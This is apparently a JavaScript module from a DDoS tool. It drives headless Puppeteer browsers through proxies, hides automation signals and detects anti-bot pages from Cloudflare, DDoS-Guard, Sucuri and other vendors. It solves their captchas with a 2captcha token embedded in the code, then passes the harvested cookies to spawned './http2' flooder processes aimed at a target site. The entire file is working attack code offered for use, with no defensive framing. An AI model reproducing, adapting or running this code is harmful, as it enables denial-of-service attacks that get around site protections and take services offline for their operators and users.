// Remove useless errors
process.on('uncaughtException', function(e) {});
process.on('unhandledRejection', function(e) {});

process.setMaxListeners(0);

function log(string) {
    let d = new Date();

    let hours = (d.getHours() < 10 ? '0' : '') + d.getHours();
    let minutes = (d.getMinutes() < 10 ? '0' : '') + d.getMinutes();
    let seconds = (d.getSeconds() < 10 ? '0' : '') + d.getSeconds();

    console.log(`(${hours}:${minutes}:${seconds}) ${string}`);
}

require('events').EventEmitter.defaultMaxListeners = 0;
const puppeteer = require('puppeteer-extra');

const RecaptchaPlugin = require('puppeteer-extra-plugin-recaptcha');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');

const {
    spawn
} = require('child_process');

const colors = require('colors');

// JS Selectors
var selectors = {
    js: [{
        name: "CloudFlare (Legacy Captcha/UAM)",
        navigation: "cf-challenge-running",
        redirects: 1
    }, {
        name: "VSHield (JS)",
        navigation: "fw.vshield.pro/v2/bot-detector.js",
        redirects: 1
    }, {
        name: "Baloo",
        navigation: "Please wait a bit ...",
        redirects: 1
    }, {
        name: "MyArena (JS)",
        navigation: "Сайт под защитой MyArena.ru",
        redirects: 1
    }, {
        name: "Custom",
        navigation: "Анти DDoS защита",
        redirects: 1
    }, {
        name: "React (JS)",
        navigation: '<script src="/vddosw3data.js"><\/script>',
        redirects: 1
    }, {
        name: "BlazingFast (JS)",
        navigation: "<br>DDoS Protection by</font> Blazingfast.io</a>",
        redirects: 1
    }, {
        name: "DDoS Guard (JS)",
        navigation: "check.ddos-guard.net/check.js",
        redirects: 1
    }, {
        name: "CloudShield (JS)",
        navigation: 'Performance, security and DDoS protection by <a href="https://cloud-shield.ru/?from=iua-js-en" target="_blank">Cloud‑Shield.ru</a>',
        redirects: 1
    }, {
        name: "StackPath",
        navigation: "<title>Site verification</title>",
        redirects: 1
    }, {
        name: "Sucuri",
        navigation: "<html><title>You are being redirected...</title>",
        redirects: 1
    }, {
        name: "LowHosting (Silent)",
        navigation: '<script src="/process-qv9ypsgmv9.js">',
        redirects: 1
    }]
};

var proxies = []; // for global using

var userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 Edg/100.0.1185.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 Edg/98.0.1108.62",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.26 Safari/537.36 Edg/101.0.1210.14",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36 OPR/80.0.4170.86",
    "Mozilla/5.0 (Windows NT 10.0; Win64; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36 OPR/85.0.4341.60",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21",
    "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0"
]

function randomInt(x, y) {
    return y ? Math.round(Math.random() * (y - x)) + x : Math.round(Math.random() * x);
}

function getUA() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

function getProxy() {
    let proxy = proxies[0];
    proxies.splice(proxies.indexOf(proxy), 1);
    return proxy;
}

function findProtection(html) {
    for (let i = 0; i < selectors['js'].length; i++) {
        if (html.includes(selectors['js'][i].navigation)) {
            return selectors['js'][i];
        }
    }

    return false;
}

function formatCookie(cookeis) {
    let normalized = "";

    for (let i = 0; i < cookeis.length; i++) {
        normalized += `${cookeis[i].name}=${cookeis[i].value};`;
    }

    return normalized;
}

async function closingBrowser(browser, page, args, config) {
    try {

        log('[' + 'Info'.cyan + '] Reloading page...');

        await page.reload({
            waitUntil: ["networkidle0", "domcontentloaded"]
        });

        // await page.waitForResponse((response) => {
        //     if response.status.startsWith(`2`) || response.status.startsWith(`3`) {
        //         log('[' + 'Good'.green + '] Response code: ' + response.status);
        //         return;
        //     } else {

        //     }
        // })

        log('[' + 'Info'.cyan + '] Page reloaded ...');

        var normalizedCookie = formatCookie(await page.cookies());
        var title = await page.title();

        if (title == "" && normalizedCookie == "") {
            log('[' + 'Suspicious'.yellow + '] One session did not receive cookies.');
        } else {
            log('[' + 'Good'.green + '] Title: ' + title);
            log('[' + 'Good'.green + '] Cookie: ' + normalizedCookie);

            for (let i = 0; i < args.threads; i++) {
                spawn('./http2', [args.target, config.ua, args.time, normalizedCookie, "GET", args.rate, config.proxy]);
            }

            log('[' + 'Good'.green + '] Flooder started with: ' + normalizedCookie);

            await browser.close();
        }
    } catch (e) {
        log('[' + 'Error'.red + '] Unknown error.')
        log(e);
    }
}

async function detectJS(browser, page, args, config) {
    // Find JS
    let JSorCAPTCHA = findProtection(await page.content());

    if (!JSorCAPTCHA) {
        log('[' + 'Info'.cyan + '] No JS/Captcha.');

        return closingBrowser(browser, page, args, config);
    } else {
        log('[' + 'Info'.cyan + `] Detected ${JSorCAPTCHA.name} on [${browser.process().pid}].`);

        if (JSorCAPTCHA.name == "CloudFlare (Legacy Captcha/UAM)") {
            // CLOUDFLARE LOCA
            try {
                await page.waitForSelector('#cf-hcaptcha-container');
                log('[' + 'Info'.cyan + '] Solving Captcha..');
                await page.solveRecaptchas();
                log('[' + 'Info'.cyan + '] Solved Captcha..');

                config.protections.push(JSorCAPTCHA.name);
                detectJS(browser, page, args, config);
            } catch (e) {
                log('[' + 'Info'.cyan + '] Error. Maybe not Captcha, managed challenge')
            }
        }

        // solving
        for (let i = 0; i < JSorCAPTCHA.redirects; i++) {
            await page.waitForNavigation({
                waitUntil: 'domcontentloaded',
                timeout: 15000
            });
            log('[' + 'Info'.cyan + `] Passed navigation [${i + 1}/${JSorCAPTCHA.redirects}] on [${browser.process().pid}].`);

        }
        config.protections.push(JSorCAPTCHA.name);
        detectJS(browser, page, args, config);
    }
}

async function startSolver(args, proxy, ua) {

    // creating puppeteer instance.
    const opts = {
        args: [
            `--proxy-server=http://${proxy}`,
            '--disable-features=IsolateOrigins,site-per-process,SitePerProcess',
            '--flag-switches-begin --disable-site-isolation-trials --flag-switches-end',
            `--window-size=1920,1080`,
            "--window-position=000,000",
            "--disable-dev-shm-usage",
            "--no-sandbox",
        ],
        headless: true,
        ignoreHTTPSErrors: true
    }

    // trying create new page
    try {
        const browser = await puppeteer.launch(opts);
        const page = await browser.newPage();

        // Configuring browser (For best experience)
        await page.setUserAgent(ua);
        await page.setJavaScriptEnabled(true);
        await page.setDefaultNavigationTimeout(60000);

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => false
            })
        })

        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'platform', {
                get: () => 'Win32'
            })
        })

        log('[' + 'Info'.cyan + `] Created new: [${browser.process().pid}].`);

        await page.goto(args.target, {
            waitUntil: 'networkidle2'
        })

        await page.waitForTimeout(1000);

        try {
            if (args.clicktext != 'false') {
                const clickText = text => {
                    return page.evaluate(text => [...document.querySelectorAll('*')].find(e => e.textContent.trim() === text).click(), text);
                };

                await clickText(args.clicktext);
            }
        } catch (e) {
            log('[' + 'Error'.red + '] HM (sus error/Element dont found): ' + e);
        }

        let config = {
            proxy: proxy,
            protections: [],
            ua: ua,
        }

        // checking JS
        return detectJS(browser, page, args, config);
    } catch (e) {
        // log(e);
        // runSolver(args);
    }
}

async function runSolver(args) {
    let proxy = getProxy();
    let ua = getUA();

    startSolver(args, proxy, ua);
}

function main(args, proxy) {

    // reorganize proxy massive
    proxies = proxy;
    log('[' + 'Info'.cyan + '] Proxy reorganization successfully completed.');

    puppeteer.use(StealthPlugin());

    // Captcha solver configuration
    puppeteer.use(RecaptchaPlugin({
        provider: {
            id: '2captcha',
            token: 'a19e9a545c31ac3cb663472e286c8ad1'
        },
        visualFeedback: true
    }))

    // Creating browsers.
    for (let i = 0; i < args.sessions; i++) {
        runSolver(args);
    }

}

module.exports = main;